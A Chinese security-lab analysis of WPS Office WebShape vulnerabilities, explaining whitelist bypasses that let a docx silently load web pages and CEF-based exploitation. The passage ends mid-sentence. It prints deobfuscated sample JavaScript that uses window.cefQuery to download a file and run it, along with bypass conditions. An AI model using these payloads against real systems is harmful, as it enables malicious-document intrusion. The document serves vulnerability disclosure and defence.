#  原创Paper | WPS WebShape 漏洞及利用分析   
原创 404实验室  知道创宇404实验室   2023-10-20 16:47  
  
**作者：Sou1rain@知道创宇404实验室**  
  
**日期：2023年10月20日**  
  
****  
**1. 前言******  
  
  
参考资料  
  
8 月 9 日的时候 WPS 官方发布了一条代码执行漏洞的安全通告, 另外根据收到的样本和各类通告，发现在今年的攻防演练期间先后三次发生了不同的针对 WPS 利用链的代码执行攻击。通过我们的研究分析发现，该系列的漏洞都因为在 docx 文档中插入了一个浏览器对象 WebShape，由于 WPS 使用了 Chrome 嵌入式框架（CEF），该对象可以直接调用 Chrome 渲染 Html 网页，这三次都是因为 WPS WebShape 漏洞造成的攻击事件，分别为：  
1. 通过 WPS WebShape 白名单之一的匹配项访问网页，利用 Chrome 嵌入式框架（CEF）的渲染进程和浏览进程通信的接口和 brower 进程通信API实现文件下载和执行。  
  
1. 通过 WPS WebShape 白名单之一的匹配项访问网页（绕过方式跟上面提到第一次是相同），利用 Chrome 内核历史漏洞实现命令执行。  
  
1. 通过 url @  
 绕过再次利用 WPS WebShape 白名单之一访问网页，利用 WPS 自带的 JS API 中的功能实现特定路径文件的删除、下载和运行。  
  
本文就是针对这些三次漏洞关键点进行详细分析。  
  
**2. 实验机环境******  
  
  
参考资料  
```
Windows 10 专业版 22H2
```  
  
为了后续分析调试方便，手动在 WPS Office\version\office6\cfgs\oem.ini  
 文件里添加以下内容后，即可通过 Alt + F12  
 键打开JS的调试窗口。  
```
[support]JsApiPlugin=trueJsApiShowWebDebugger=true
```  
  
另外在较旧版本的 WPS 上，在断网情况下访问某些页面会显示 url 和错误提示，这时按 F12 也会出现调试窗口，且在wpsweb://error  
 域下。  
  
**3. 事件 1 分析******  
  
  
参考资料****  
  
  
通过捕获的样本发现，攻击者通过白名单匹配项访问域名 https://[xxx]wps.cn/exp.html  
，利用 CEF API window.cefQuery 和 brower 进程通信实现文件下载和执行。  
### 1. 白名单利用  
  
分析版本：  
```
WPS 11.1.0.12313
```  
  
该漏洞触发点在 kso.dll 的 KxWebExtensionView::delayShow  
 函数中。  
  
在多次调试中，发现 KxWebExtensionView::delayShow  
 只要调用了 KxWebExtensionView::delayShowWebView(this)  
 函数便能无任何提示成功创建访问连接，实现 0click，因此能执行该函数的通路将是重点分析对象。  
  
KxWebExtensionView::delayShow  
 函数开头调用函数获取 docx\word\webExtensions\webExtension1.xml  
 中的 wpswe:extSource id="EXTSOURCE"  
。  
  
然后调用了 GetUrl 去获取 QSting 对象然后作长度判断。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAx3yD8hS0xNwAJB6joJKicST4oGZruWkiarQIQaB1ldph8yTtxwwOprQA/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAx3yD8hS0xNwAJB6joJKicST4oGZruWkiarQIQaB1ldph8yTtxwwOprQA/640?wx_fmt=png "")  
  
分析一下 GetUrl 调用过程。  
  
首先调用 kso_qt::QCoreApplication::instance  
 获取当前应用程序实例指针，然后将指针作为参数传入 KxApplication::GetWebExtensionMgr  
 获取 WebExtensionMgr，再作为参数传入 GetUrl。  
  
分析一下 KxApplication::GetWebExtensionMgr  
 函数如何构造 WebExtensionMgr。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAUAAlBYGvLGghU6icJJvUNg8nNONu0hmB0AASHstQ7bCSn7KjNiclI7sQ/640?wx_fmt=png "")  
  
可见 WebExtensionMgr 是一个指向八字节空间的指针，进一步分析 KxWebExtensionMgr::KxWebExtensionMgr  
 函数。  
  
KxWebExtensionMgr::KxWebExtensionMgr  
 函数先拼接路径打开 kwebextensionlist.cfg  
 文件并验证数字签名，然后对 WebExtensionMgr 第一个四字节进行赋值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAszLq6lX4Nu54XtAQe6OFRH15zsmvfWc6MVHzn70kDaNgdibPwxb8XHg/640?wx_fmt=png "")  
  
上述过程调用 kso_qt::QSettings::QSettings(QSetting_Object_cfg, cfg_path_QString, 1, 0)  
 将 cfg 文件以 INI 文件格式储存到 QSetting_Object_cfg，再将 QSetting_Object_cfg 前四个字节赋值为 QSettings 类的虚函数表指针，把 WebExtensionMgr 前四个字节赋值为 QSetting_Qbject_cfg 的地址。  
  
在 cfg 文件同目录下有一个 config.ini  
 文件，接下来同样拼接路径打开文件验证数字签名，对 WebExtensionMgr 后四个字节进行赋值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAad5wQxagKrRHBj2qKK1e0OXticHqht7SEVSZibe9Lp099xxZibwSy4SPQ/640?wx_fmt=png "")  
  
上述过程从 ini 文件中提取键名为 trustedDomains  
 的值，并用 |  
 分割，把分割结果地址赋值给 WebExtensionMgr 后四字节。  
  
自此 WebExtensionMgr 结构已知晓，这个结构体对之后的分析大有帮助。  
```
struct WebExtensionMgr{  QSettings cfg  QListData ini_trustedDomains};
```  
  
接着分析 GetUrl 做了些什么。首先调用了 GetRegUrl 函数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAwbIfXKt3oTAcBgQIgjIhsp8MsEkHeK4pn8kbnTOR9MgIqUKTzXrgag/640?wx_fmt=png "")  
  
GetRegUrl 会在注册表 HKEY_CURRENT_USER\Software\kingsoft\Office\6.0\plugins\webshape\EXTSOURCE  
 下寻找 debug  
 键，如果没有就返回。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAA8cexib5v3ZX4AlLjW8A5iauWoPzbH4mc9qsBeu9b9cHJJ0gFS4mWVTKw/640?wx_fmt=png "")  
  
如果找到 debug  
 键，便获取 debug  
 的值，不为 0  
 后再取 url  
 键值作返回值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAA3wPhfIg5GcicBO7gM7srOFGNERibBd2n7aEGNR0icoe8icOBjvx94XKt3Q/640?wx_fmt=png "")  
  
GetRegUrl 返回后长度判断如果为 0，便调用 GetStringValueFromCfg 函数。在 GetStringValueFromCfg 中，先利用 WebExtensionMgr 获取 cfg 的 QSettings 实例，然后在参数指定的节下寻找指定的键，获取键值并返回。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAmvEzqicrSjUWb89AnJKECAwl6xBNEuibLBoWxMuib5rCictDzpibZIvMFibg/640?wx_fmt=png "")  
  
如果 GetUrl 成功获取到了 Url 通过了 QString 长度判断，便会调用 KxWebExtensionView::delayShowWebView(this)  
 放行通过。  
  
未能获取到 Url 后，先调用函数获取 PoC_docx 中要访问的 Url，创建QUrl，获取 host 后按照 GetUrl 函数调用顺序去调用 GetTrustedHosts。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAshdZG7ptvJjyUAIer2oxnT7CSfwxnCA9M3JVkw6qKGCUVZsYfLIcFg/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAshdZG7ptvJjyUAIer2oxnT7CSfwxnCA9M3JVkw6qKGCUVZsYfLIcFg/640?wx_fmt=png "")  
  
在 GetTrustedHosts 中首先调用了 GetStringValueFromCfg 函数获取配置项。根据上面对 GetStringValueFromCfg 的分析可知此处会在 cfg 中寻找 EXTSOURCE  
 下面的 trustedHosts  
 键，并获取键值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAs15Mng3Bg2iaMm3E5qu2uFzxrrfXH1F9ka1ANBTyb52buibg7wspJKVQ/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAs15Mng3Bg2iaMm3E5qu2uFzxrrfXH1F9ka1ANBTyb52buibg7wspJKVQ/640?wx_fmt=png "")  
  
接着将 trustedHosts  
 键值用 |  
 分割，利用分割出来的元素进行哈希和其他运算，储存进 QHashData 节点，然后 return QHashData**。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAhzTBcCvGD5XIMmaLqVfBxPhI0vxHbKnTrKK4zWS1e002gVRyHCbgXg/640?wx_fmt=png "")  
  
调用完 GetTrustedHosts 后，对 host 进行长度判断，通过就利用 GetTrustedHosts 返回的 QHashData 对 host 进行核算，核算通过便放行调用 KxWebExtensionView::delayShowWebView(this)  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAArvX5wGQeAdAiby8CzwcXrrTys4t6JHibcR9NKs8mHzQWmncNTMOeNmUQ/640?wx_fmt=png "")  
  
如果未能通过核算，调用 IsTrustDomain 进行字符串匹配，通过匹配放行调用 KxWebExtensionView::delayShowWebView(this)  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAwRjoPrFqeFKffUOHTSzia13oYB5buu1bG9PicRvAtod9VgicgJKKnWsSw/640?wx_fmt=png "")  
  
未通过就设置按钮让用户选择是否信任。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAQOUxccqvP7335AHDtyZLPfichDdrnTCqCPZds3skBVtPoPHKYHgUlqw/640?wx_fmt=png "")  
  
在函数 IsTrustDomain 中，利用 WebExtensionMgr 提取 ini_trustedDomains 字符串，判断 host 是否以 ini_trustedDomains 中的字符串结尾。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAAUQ51cYTW5ZtRJjH9lQSFrkVMk6ZgL82knOtolmGUJNwOjHeLicCLKwg/640?wx_fmt=png "")  
  
通过调试和 config.ini 文件，发现只要域名满足以 wps.cn  
 或者 wpscdn.cn  
 结尾即可放行通过。  
### 2. 白名单总结  
  
根据以上分析可知有三种方式可以 0click 无提示访问域名：  
- 通过访问注册表 HKEY_CURRENT_USER\Software\kingsoft\Office\6.0\plugins\webshape\EXTSOURCE  
 获取 debug  
 键的键值，不为 0  
 即可访问同路径下的 url  
 键的键值。  
  
- 通过 WPS Office\version\office6\addons\kwebextensionlist\kwebextensionlist.cfg  
 文件中 EXTSOURCE  
 节下 trustedHosts  
 键的键值进行访问。  
  
- 以 WPS Office\version\office6\addons\kwebextensionlist\config.ini  
 文件中 trustedDomains  
 键的键值结尾的域名，即以 wps.cn  
 或 wpscdn.cn  
 结尾的域名可实现直接访问。  
  
本事件中白名单利用便是利用 config.ini  
 中的可匹配项进行绕过。  
### 3. 白名单 url 末尾字符串匹配项版本测试  
  
在过低的版本中，WPS 并未引入 WebShape，因此不会因为该组件产生任意网页自动访问。在高于11.1.0.12313 的版本中，config.ini  
 中 trustedDomains  
 的匹配项均以被删除。  
<table><thead><tr><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">WPS 版本号</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">trustedDomains 匹配项</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">该版本安装包签名时间</span></th></tr></thead><tbody><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.11365</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">未删除</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年3月1日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.12300</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">未删除</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年8月2日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.12313</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">未删除</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年8月15日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.13703</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">已删除</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年3月1日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.14309</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">已删除</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年4月27日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15120</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">已删除</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年7月13日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15324</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">已删除</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年8月9日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15374</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">已删除</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年8月28日</span></td></tr></tbody></table>  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAA2wUZkq1PVxnEVjpBAJpicwkKgjVQy05kQuyy7mk1KB6bcJoh08anvPg/640?wx_fmt=png "")  
  
在最新版的 WPS 12.1.0.15374 中，负责处理白名单的 KxWebExtensionView::delayShow  
 函数已被弃用，未删除也未调用，新增了一个 KxWebExtensionOsrNotify::show  
 函数用以替代，新函数和旧函数的整体逻辑并无改变。同时 KxWebExtensionOsrNotify::showWebView  
 替代了 KxWebExtensionView::delayShowWebView  
，函数 GetUrl 内删除了对 GetRegUrl 的调用，现在无法通过注册表访问特定域名。  
### 4. WPS Query 利用  
  
将捕获样本中的代码解混淆后，下载任意文件的代码如下所示：  
```
function ExecClientApi(param) {    window.cefQuery({        'request': 'jsAsynCall("' + param + '")'    });};function download() {    ExecClientApi(JSON.stringify({        'method': 'common.util.download',        'params': {            'url': url_exe,            'path': path_exe,            'directGet': 1        }    }));}
```  
  
window.cefQuery 是 Chrome 嵌入式框架（CEF）的渲染进程和浏览进程通信的接口。根据代码判断，渲染进程发送JS代码调用相关的代码，实现了任意文件下载。  
  
由于仅在2022年3月安装包的调试模式下复现成功，这里简述该样本的利用思路。  
  
首先使用 common.util.download 下载恶意文件，下载过程中未下载完成时文件名会被加上后缀 kdtmp，在下载完成后会将该后缀去除。使用 setInterval() 定时调用 common.util.isFileExist，通过设置的 callback 函数判断下载的文件是否存在，也就是文件是否下载完成。  
```
{    'method': 'common.util.isFileExist',    'params': {        'path': 'filepath'    },    'callback': 'window.js_callback_function'}
```  
  
如果文件下载完成，通过调用 common.util.openUrl 实现下载程序的运行。  
```
{    'method': 'common.util.openUrl',    'params':{        'url': 'C:/windows/system32/calc.exe'    }}
```  
  
对于样本中下载多个文件实现白+黑利用等其他细节，就不多赘述了。  
### 5. WPS Query 利用版本测试  
  
经过测试，该利用方式的复现情况如下：  
<table><thead><tr><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">WPS 版本</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">该版本安装包签名时间</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">是否复现</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">JS调试窗口是否触发</span></th></tr></thead><tbody><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.11365</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年3月1日</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">http:// 下无法触发，wpsweb://error特权域下可以触发</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.12313</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年8月15日</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.15374</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年8月28日</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td></tr></tbody></table>  
综合判断 WPS Query 利用可能是 WPS 历史上出现的某个利用链，大概率已经被官方修复或在更新过程中接口出现变化导致利用失效。  
  
**4. 事件 2 分析******  
  
  
参考资料  
  
该事件来自于 WPS 官方通告事件  
。由于 WPS 使用了 Chrome 嵌入式框架（CEF），且以 --no-sandbox 启动了渲染进程，所以 Chrome 的历史漏洞可以在绕过白名单后重新发挥威力。  
  
**1. 白名单利用**  
  
本次事件利用同事件 1 中所用的以 wps.cn  
 结尾的 url 访问域名，再通过 Chrome 内核历史漏洞实现命令执行。  
### 2. Chrome 内核历史漏洞利用  
  
根据访问网页 1.html 的 PoC 核心段代码和 Chrome 漏洞的限定进行查找，可以匹配上该 Chrome 历史漏洞为 CVE-2022-1364。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT3iahqCkYYjmw1gI9aGgwgAA6VCGzUP6efJy7Tj7qGUDfOPYFjPEOXg0PCXgucQMKunOeUl0KkE41g/640?wx_fmt=png "")  
  
关于 Chrome V8 引擎的漏洞利用可以看看 Hcamael 师傅的 V8 通用利用链文章。  
### 3. CVE-2022-1364 版本测试  
<table><thead><tr><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">WPS 版本号</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">是否复现</span></th><th style="padding: 8px;text-align: left;line-height: 20px;vertical-align: top;border-top: 0px;border-right-color: rgb(239, 239, 239);border-bottom-color: rgb(239, 239, 239);border-left-color: rgb(239, 239, 239);color: rgb(0, 0, 0);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">该版本安装包签名时间</span></th></tr></thead><tbody><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.11365</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年3月1日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.12300</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">是</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年8月2日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.12313</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">是</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2022年8月15日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.13703</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">是</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年3月1日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">11.1.0.14309</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年4月27日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15120</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年7月13日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15324</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);background-color: rgb(246, 246, 246);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年8月9日</span></td></tr><tr><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">12.1.0.15374</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">否</span></td><td style="padding: 8px;line-height: 20px;vertical-align: top;border-color: rgb(239, 239, 239);"><span style="font-size: 15px;font-family: Optima-Regular, PingFangTC-light;">2023年8月28日</span></td></tr></tbody></table>  
11.1.0.11365 版本使用的 libcef 为 jcef，因此复现未成功，在 11.1.0.13703 版本以后该漏洞都被修复。  
  
**5. 事件 3 分析******  
  
在该事件中利用了一个 url 绕过，该绕过可被攻击者结合利用白名单中 config.ini  
 文件的 url 末尾字符串匹配项进行任意域名自动访问。  
  
当 config.ini  
